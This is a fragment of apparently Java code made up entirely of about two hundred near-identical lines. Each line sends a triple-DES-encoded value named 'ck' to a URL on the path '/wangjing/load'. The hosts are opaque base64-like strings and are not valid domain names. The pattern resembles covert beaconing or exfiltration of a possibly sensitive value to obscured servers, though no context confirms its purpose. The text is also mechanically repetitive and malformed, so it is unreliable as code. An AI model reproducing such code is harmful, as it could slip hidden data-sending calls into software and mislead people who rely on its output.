                                    aab.ca("http://C+3KPIMxKkuMQYAPNElfEQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://pfMFtRXq4T56KwiAUHSuTQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://Y6lCJWf4fAH5rJk5l5Ze3Q==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://Oo1iT/Xf6/7FczRpK6/3HA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://Z20nJfE3wmPXTLhqh/sApQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://3MkFhOASVY2dsZXz0Rksjw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://IxIKGLcXEMki+60P9E+47Q==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://+YAN9wpr21TvVTZq1ijpng==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://iJN9rd8RAZ0a64cQ87pgCg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://uT68o+xqs1yQDZOUJPagOQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://vX/yvrsn3Sfye/0hnhAseg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://S+rbONpzU3wYwBh8baBGEg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://6x8lg3H9AGgQoVf0WyE7LA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://PGKVro91gdIDz4lF/m7zdg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://V0s/DobGi+mRZd5jdFk03Q==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://20jB8CShTtKNDOI4Ij3yew==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://rguL++cyjIrbx/Lo8O91Mg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://rvyQvyEcgKU2ETzvbU56AA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://KaEcXEULQbZz0eT8wM5JNw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://kmkG2iIay6pMjOJABe+qIQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://+uVfQohXTTNQn676phxFZw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://ILA8lv8i3o+s8bMZMxqwkQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://fsEXnAbSDdxHTuGG7+oFWQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://7o7dXEskOFsscmfH1D7/qQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http:///W+Vyo58Zcij/7DQOAvvrg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://tlZeD3a0mew1heqr5SvRXQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://6FydbCalAQTXyie11oJW+Q==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://ccE2xOIUNFFbIXxX8AWsGA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://n+g0tU6oJU2/sfUVRuIYWQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://Knze5403VSYuBg/ruTzf2Q==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://SGDkJCEBCuVhvfZBTL6+pQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://VvoSYlSR7eR+hvlAUFdJeA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://nppLi7fN7kLiVf8V3m+FvA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://Cm2OY1mD6nMX3Jr/sgWITg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://1irj/bjBvdtOG5QCUXbTrw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://JjpXBkA316ruZWlxJqYGWw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://skWQCNjHnMzac3iKSp4p/g==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://MFPWDpZZyvSrIpWNS03VLA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://mqQTwvfzSOs/nhlsul7Sxw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://cuGUNlA14Y8ztUKNUK4y8A==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://GyshDWjtjVT519YXO+c7yg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://9/Lkl36be2nIl2/+aPykoA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://FYXK5es4PT/ueD+GiScv8A==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://+rkgbiWqKQP8CeTO+73BHQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://Aj9Gxt2w/5vufhgwrDlWog==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://PKHh1i4H5S9eAATSK6+BsA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://xKyNX5OHzrwX1ulgOr+Z2Q==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://R0YpHXBW7k75DiHnM9oXjQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://wsUZiyRzH1YFSQYqFDZ11w==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://SRerkSVTvATsbT4imQTf3A==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://OCkKxDfREwY1R5iVQ0QN2w==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://YuecCmghO2S+kmXmyUbmiw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://rccVKDAII495PDrcFfjuJw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://glKRqFAx+Y+YHU05LViVbQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://5BSbYaxnfk1MVvRGsu74rw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://rjtPwhw335ILSCptsrJiMQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://KEEDinXfEkJ/nasD+K7PsA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://1VvvjEPwLCyk3jIAUupdtw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://CFfixwGaRh4NxZy8Rm7p9g==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://GEehVEdsTL0oUy09tdgBYA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://HCAQVdYfqeS5xTMEOXLxDQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://w6zmvWTPl6L7tSV8QttE1g==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://QBeyyi4oSRM+p1Uhi+5LsA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://Bn4LnIpAmjWr6boXXwcUCA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://N/2NGUSH44gV1nlrSK+iRQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://oNm9+dHhkLP4ZStk0ZFOLA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://UOxetg3r++TMCmbBN8psXg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://9BildVVFm+XwBlHdYWyMFQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://8DPBS4VkeBX1XlYHFiwVwg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://GsY3C8COR+OAIViR6L0u3w==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://sX0EkVY/wRLGrtfmXpcvEw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://DhGeL0Xys+t2rlL9l2Mjxw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://nnCsm/aVKVi+cFC/jZn4wA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://ZrW1sG7JHJ3dCXaGVGXB3w==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://yKLOFQH1NajecNCiqEl7uQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://V2GEKgi7VcZQuZY1UaEw4A==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://MFqbYfCWf0N0OGXu05cFBA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://mGoaE/CVBngitEE+842UMg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://VOr2OciJIJb0VToQRMUA6A==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://sKrWeJQcCwVaR8hKlETO/g==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://TWvv9IpGFjoX10YwGqinAQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://qoqC5WOgsOjwmrpjNEIUZw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://Yw6phqVr3250EA0h908gEw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://Gi94NybAv6/3dg9vQBvJ/Q==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://IOb859MZOje2xYotelNOIQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://LRCSflK9EXhcVww1m5gDYw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://5AIkmqoUzSQnpELHBceuGQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http:///21wmNEHq7mpp/roSsvLmw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://c9uyvdEvU3FgCJ6FXnHX1g==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://xSPgG1WMXbAbchYWYF4V7w==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://2xCtPqEsMU7l0GuY9T4Q4g==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://zDfca2H1jGnEWyt9yCmzog==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://SQMEOHLgD5hbHERi3cfYgg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://0sUE5JWljuFez7q5jxCbxg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://f3GI8xfVib0wudE7CITdqw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://Dbu9ESANDJX7TC6eMOmftg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://7GtHN0DWEkcl3DkN4OEIVw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://fayvKmuPB2oYVSZAOXItxQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://YcbQeUk91PjVKaJpU3Y74g==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://EheNZaEXmSwRfGAtIfMf9Q==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://edlVUBtH1W0Og7uBBehlPg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http:///whm4/Vl+uL0clp2WgtG1A==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://T6DubEXOcsvXbhTLqSEFFw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://cDeQ8+oVZLnqL4U263ZnEw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://l6o3EvcP3mxmMOV8+zwtLQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://aaLSAxuFSTFklOnyLw442Q==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://bU9JIEIkjKmRRqpACISMMA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://Pwlgc2Fb+FBlM1stGG9rkQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http:///8qyyny11ZYdnZTRjI+8Pw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://f0FMDFlKio7/C6JrCgsIVw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://hte2RjGnKUyIdKr2XZ5PQQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://6+vs6M+OBS4L9frdKDXeIg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://HUjLfnij3HyAXC8l843r/A==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://aC822gYS14pGQ8mvupKpBQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://q19R/rxulEyLtAeF+fJTHQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://Ko2BB17e0Z0rnvDv+UmSJg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://2x8d38ohHkSLXwtiuv71FA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://MT/wm6hV/2J0aenj5kRvAQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://MHj5dC71ljXtw+5XiAtRhQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://K13C6bFXFkO0Ko2hQn0mAA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://mXeU9T9zZfflKM9RwN8Gxg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://ubEAhHhiMkbKLJxqv8GV7Q==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://rvBxqbeMwvWVQ6B0Nv6asQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://3jA7c6nmWmsha3wlfcw23Q==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://yYQNS+SMR9MUmW23r3rxZw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://avnS/u6qyOPd2NCI7gqC5w==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://3AG0fuZVUwdJhjQi04KgzQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://veaN0NEdLZ0XQs/3Ab3z5A==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://ENQ7pSSNLKCXG1VLZI+Ziw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://hZaS7UAs9CUDeUt1es5bNQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://q24BgHLWYipUteqetdqDow==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://DUiMSB2U3QUwflt/0MIbmQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://vw7PnAfYcpYP4ng5IiVO5w==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://h/M5YRPctsBvDFKed+/kEg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://gyg0trEFfYWIpltL3GS6tg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://rE5BgbOTDIiDF4N7g0SGTQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://0PifEJDTkjlwf6aovP6EiQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://vR/q0RGi9zS8dLio/WrgWQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://7y8v9drEvtkChCof2eRe7w==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://OjJ1IzZAJK7L2WQZeIDzvg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://EGLdvVbX3Y8ldB3x+foaYQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://fViOJvvDtTWzaPVZ4kR3bg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://TsOKJx6dug60aSysv11sqA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://f8JceZTPumf5YRfHKsNdvg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://ZQYjM9WEODF2IaqqaPY7NA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://3C82Fwah2W3eN6EPSLR3FA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://ql7ZrjAhvDxJ0HhCgF24Iw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://B7dWrT8V95/g2jEpUZiZ9Q==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://n/Kj2sCYibH5qowLF+nGhQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://e21nrQr51uYF2OMzsCDnYg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://0Bl0MSoEdAm1qHoYJ95EHw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://xyUUoimbWrtAfmtr28PzIQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://5ppcjfOqb9pe9/8vWSu9RQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://D8Auj/Iqt2B0Mbq6X5GNhA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://wHi1egHp7AFusaAMWk509Q==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://Ut0rLh6l+a9fWa37xoniJA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://w6wUhWidViSSO4sd3Qs3Ig==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://ASUtPOkExOyXPyJ4JSm+vw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://tK46It7OYCWih0HUl/KUKQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://22DepJ1pJwBiWgU/kGHA8A==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://l+t1lE9d2aXfkuJf0jPzGg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://KCpLVvv2GxM7B9z0C1NGkA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://324Mt89SdVbLWYu2TGUDxw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://qmTSXQrDGIO2qHuSE+FT6Q==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://jdV5qAQ8hS1A91QbsK3zCA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://OCuFWUoHuLG3M50ziJ3GUA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://G9MAN4lp9lzZ73VSBTVgwQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://SlyuNWorr9HNrxNBnNJCog==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://6LH7woQGYHTIuGgBS+sdfw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://Z/8RnCknK1AEvSYRnkWo5g==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http:///sO0mlO94dhx8JLqgf3dIw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://nRgZCbmc7CCwDTQNnLMjuA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://HcOKdiTDtPsa5aj12OgvVg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://51n1Glo6EHTIg9nGJJvnTg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://++9jVob6M3aU+m6FaBqSTg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://vIzyP+wK/SonTw+RR/mQpw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://rWJ1DI+z9Nr4EBkg4UStYQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://8092qOcuojql1a6fdVUpwA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://IxzkaXTEowtIhQY5WIUY6g==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://pCA+wXRGyvuosLWx8t8lEA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://N+oAws7vpyOv8rleaLRTvw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://jShLw2tMm15g0UaCT+91Jg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://gGscSLo6rPLHT+hnBxpn1Q==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://CNL6Kuc8XMCmVc+bI9Eyag==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://hlJ0tyPI7kdUWfS8nz8A2w==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://KkyEug63LZuSnq6KmQbaiA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://pNcxsd84DC5vfCk09FWKPQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://wtpN+qrUJV1X/n4hDRlK6g==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://iZf2Td0Per16tXDOrZWjzA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://2hdXlAK5Sz3OktcG7InhiQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://pZ74DGBHuFQERtsjRwSgyQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://0ja2ZXrDyII0i8VZM9Wk3Q==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://KVbC+PDygY1U2RFIDf5uHw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://H/nH8cTfAZrhKkp6pFVPcw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://se/EO+TaXlLca9gZjeuaGg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://57DQcW5E043I4MuzFDvtwg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://b2FvEb4dxCZ9Bv10EmIFxQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://Uy8JqFuTgCRb6uBUu4I5jg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://2/UO5zkbl7Wr0T6KJGnZTg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://o9WZ7+JkDJ1/LmcnLxANNg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://dx9DMUTHSRKp4nCoQuCuBg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://8Uvjy9H7SCleQN43Ptpw4g==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://tRTxpATpxcBkNFXVCwKBkw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://dvW7XaK5U3jqfB50Lgcj1w==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://4EtGQE6oIcwD9F87grcR2Q==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://5UnqtwCtFDg2jLu3u/DRCw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://n9o6MPIGUhZESo5Mot/Ikw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://P7JSKwmVZ53z82/ye/gOhg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://VZ5DYwXzmVMzqPBiujksAQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://DANYEwqSgA5XSyTDxAQcYA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://SvZ8oKkLfmVJQaEd1nBI2A==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
